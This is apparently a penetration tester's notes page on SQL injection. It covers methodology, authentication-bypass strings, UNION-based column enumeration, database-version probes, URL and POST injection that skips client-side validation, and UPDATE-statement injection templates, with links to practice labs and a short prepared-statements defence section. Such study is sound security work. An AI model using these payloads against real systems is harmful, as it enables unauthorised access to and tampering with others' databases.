# SQLInjection

## Introduction

SQL injection is a technique used by attacked to execute malicious SQL statements with objective of stealing information, modifying the database or command execution from the context of database interacting with other networked components. Application commonly require dynamic SQL queries to display content conditionally by user context. Users are then granted some part in the process of displaying that content. This input without input sanitization the attacker can make the database interpret the user input as an SQL input instead of data. With parameter control attack can inject malicious query, which may be executed by the database. For introductory material about SQL see [[Introduction-to-SQL]], if you just here for [[SQLmap-CheatSheet]] then follow the latter link.

For possibly the best hand-on-lab on the internet see [TryHackMe SLQinjections Labs room](https://tryhackme.com/room/sqlilab), it has a good curve to the challenges and has a guidance feature so that in browser you can see what SQL quiery you sent. Invaluable Payloads up-to-date payload listings can be found:
- [Payloadbox](https://github.com/payloadbox/sql-injection-payload-list)
- [PayloadsAllTheThings/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

An ode to SQLI:
```poem
title: Sleepy-Questions-Language-Idea 'behind attack=attack -- - 

sqlin' da morning 
sqlin' your evening
admin or one plus one equals two
single quote for strings
enum db char-by-char for those correct
tingles as the database query dumps things
comments breaking stuff on internet
admin password from table * select
database asleep pleasing
SELECT star FROM passwords stealing
by 7ru7h
```


## Methodology
Indication of vulnerablity: 
- variations with use of  `'` which used a string delimiter. 

Databases require instructional commands to store, organise and interact with data. 
1. The requirement is to inject maliformed SQL queries to break the query syntax through a logical mechanism and the sql parser's interpretation of characters external usage in token classification.  
	- The `-` comment  character is recognised as a break from a functionality to interact with database. 
	- Or `'` to indicate the opening of string declaration. The paring functions to consider the following set of character as string continously until otherwise stated. 
2. In breaking the query, access to debug messages or likewise indicated through commanding the server to delay its subsequent response demonstrating control of the server. 
3. If it will `sleep` because a malicious query states such for a specified length of time 
	- Then query may be transformed to the fix its breakage of syntax to 
		- Then query actual information on the database. 
			- [[FFUF-Cheatsheet]] maybe useful in fuzzing fields of the database.
		- Or use the system hosting the database to use the database as storage for further movement with commands to code excution. 

4. Nested SQL
	- *A useful function in SQL is creating a query within a query, also known as a subquery or nested query. A nested query is a SELECT statement that is typically enclosed in parentheses, and embedded within a primary SELECT , INSERT , or DELETE operation.* [DigitalOcean Nest SQL](https://www.digitalocean.com/community/tutorials/how-to-use-nested-queries)
	- [Coderwall Nested SQLi](https://coderwall.com/p/dnf8sa/nested-sql-injections)
5. If there are multiple fields is there second order injection with `'\''` and `'"'` to generate a error, have do so for each? - [PortSwigger Second Order SQLi](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)

Al second order injections
- Figure out which field has a possiblility of second order injection with `'\''` and `'"'` to generate a error.

## Use cases for SQLi 

1. Authentication Bypass
1. Enumerating a Database `SELECT <field>, <field> FROM <table> WHERE <field>=`
	1. Column Number Enumeration - With column names or the column indexes instruct database to sort by either, to figure out the width:
		`http://url/bad.ext?<field>=1 order by 1`
	1. Detirmine Output layout - Union statement to control display, for meanful Data extraction
		`union all select 1, 2, <nth, column, width, delimitered, with , comma>`
1. Data Extraction
1. SQLi to Code Execution


#### Characters, Command and Considerations toolset
Always consider the syntax and Database Lanaguage!
MariaDB specifics, but for extensive information for see [[MariaDB-Hacking]]
```sql
;#	-- Ends querys
LIMIT 1	-- Limit number of records returned
```

MSSQL specifics, but for extensive information for see [[MSSQL-Hacking]] 
```mssql

```

MySQL specifics, but for extensive information for see [[MySQL-Cheatsheet]] [[MySQL-Hacking]]
```sql

```

sqlite specifics, but for extensive information for see [[SQLite-Hacking]] [[SQLite-Cheatsheet]]
```sql

```


## Database type enumeration
```sql
MySQL and MSSQL
',INPUT=@@version,INPUT='
# Oracle
',INPUT=(SELECT banner FROM v$version),email='
# For SQLite
',INPUT=sqlite_version(),INPUT='
```

## Defense and Migitation
[Prepared Statements prevent 'illegal' queries](https://en.wikipedia.org/wiki/Prepared_statement)

## Typology 

Attack Vector | Method 
--- | ---
Blind SQLi | Cause SQL error -> Fix it -> add SQL queries && Use sleep(5) if reponse is instant SQL query, then there is no SQLi
Union SQLi |  Find number of columns -> Check suitable columns -> Attack
With non Blind SQLi there is some form of extracted data:
- Cookies
- Field Display in HTML

**BEWARE** Boolean-based Blind injections are tedious and time-consuming, use fuzzing or script
**BEWARE** Nested functionality of i.e Registering a User and then as an Authenicated Users the Username is a SQLi on another section of the website. [[SQLmap-CheatSheet]] may require a tamper script with `--tamper tamper.py` to create a user and then exploit the target page.

## Use-full  Language Features 

Useful feature categorised by use case are featured here to provide are pointer of more that just more commonly used syntax that sterotypes alot of explainations about SQLi.

Aggration functions that concatenate non-null value in a column have utility in retrieval  of data; some language varients:
- MySQLand SQLIte  `GROUP_CONCAT()` function returns a string with concatenated non-NULL value from a group.
- PostgreSQL and SQL Server have similar functions called `STRING_AGG()`


## Attack Vectors

#### Input Boxes 

Input Box Non-String - Parameter expects an integer
```sql
1 or 1=1-- -
```

Input Box String- Parameter expects a string
```sql
admin' or '1'='1'-- -
```

#### URL and POST Injection
Consider
```javascript
// Client side controls
function validateform() {
    var profileID = document.inputForm.profileID.value;
    var password = document.inputForm.password.value;

    if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
        alert("The input fields cannot contain special characters");
        return false;
    }
    if (profileID == null || password == null) {
        alert("The input fields cannot be empty.");
        return false;
    }
}
```

URL Injection - URL bar in Browser!
```html
<!-- URL shows URL parameters -->
http://website/login?profileID=a&password=a 
<!-- Client Validation bypass, by going directly to URL  -->
http://website/login?profileID=-1' or 1=1-- -&password=a
<!-- URL encode -->
http://website/login?profileID=-1%27%20or%201=1--%20-&password=a 
```

POST Injection - POST request has data 
```html
POST /login <!-- POST request -->
Host: website
...
Referer: website
<!-- Newline goes here, below is the data -->
profileID=-1' or 1=1-- -&password=a
```

#### UPDATE statement
SQLi on UPDATE can modify database **BEWARE**
```html
<!-- html form -->
<input type="text" class="form-control" placeholder "Username" id="username" value="">
...
<input type="text" class="form-control" placeholder "Email" id="email" value="">
...
<input type="text" class="form-control" placeholder "Password" id="password" value="">
```

Enumerate with:
```sql
-- BEWARE this is a template for the above not a payload
-- consider what information the database to frontend pipeline displays
asd',username='test',email='hacked
-- Enumeration is done to gather information of:
-- Correct column names; some might not be visuable, if wrong column names it wont update
-- Then we use these columns to get data back from the database inplace of intend information
-- MySQL and MSSQL
',username=@@version,email='
-- For Oracle
',username=(SELECT banner FROM v$version),email='
-- For SQLite
',username=sqlite_version(),email='
-- Then use targeted database's SQL variant -> tablename -> target table's fields -> data
```


## References

[Prepared Statements Wiki](https://en.wikipedia.org/wiki/Prepared_statement)
[TryHackMe SLQinjections Labs room](https://tryhackme.com/room/sqlilab)
[Computerphile Video](https://www.youtube.com/watch?v=ciNHn38EyRc)
[payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list
[PayloadsAllTheThings/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
[MYSQL Group_Concat](https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php)
[SQLite Group_Concat](https://www.sqlitetutorial.net/sqlite-group_concat/)
[DigitalOcean Nest SQL](https://www.digitalocean.com/community/tutorials/how-to-use-nested-queries)[Coderwall Nested SQLi](https://coderwall.com/p/dnf8sa/nested-sql-injections)
[PortSwigger Second Order SQLi](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)